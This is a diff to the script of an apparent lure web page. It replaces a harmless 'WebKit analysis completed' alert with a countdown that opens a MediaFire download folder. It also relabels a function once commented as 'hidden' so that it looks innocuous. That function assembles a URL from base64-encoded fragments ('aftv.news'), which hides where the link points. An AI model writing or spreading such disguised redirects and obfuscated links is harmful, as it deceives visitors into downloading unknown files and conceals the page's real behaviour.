@@ -634,14 +634,14 @@
     </div>
 
     <script>
-        // FUNCIÓN DEL CONTADOR ASIGNADA ÚNICAMENTE AL IPHONE ULTRA
+        // CONTADOR REDIRIGIENDO A TU CARPETA DE MEDIAFIRE
         function iniciarContadorUltra() {
             const overlay = document.getElementById('countdownOverlay');
             const numberDisplay = document.getElementById('countdownNumber');
             let timeLeft = 5;
 
             numberDisplay.textContent = timeLeft;
-            overlay.classList.add('active'); // Activa la animación/vista del modal
+            overlay.classList.add('active'); // Muestra la cuenta atrás
 
             const interval = setInterval(() => {
                 timeLeft--;
@@ -649,15 +649,15 @@
                     numberDisplay.textContent = timeLeft;
                 } else {
                     clearInterval(interval);
-                    overlay.classList.remove('active'); // Oculta el modal al finalizar
+                    overlay.classList.remove('active'); // Oculta el panel
                     
-                    // Acción final segura sin salir de la web
-                    alert("Análisis de Subcapa WebKit e infraestructura móvil completado.");
+                    // REDIRECCIÓN DIRECTA A TU ENLACE DE MEDIAFIRE EN PESTAÑA NUEVA
+                    window.open("https://app.mediafire.com/folder/p0fnkq0hbbrt6", "_blank");
                 }
             }, 1000);
         }
 
-        // Función oculta para los enlaces de documentación alternativos de la plantilla
+        // Función auxiliar del repositorio analítico
         function executeSecureBridge() {
             const p1 = "aHR0cHM6Ly8=";     // "https://"
             const p2 = "YWZ0di5uZXdz";       // "aftv.news"
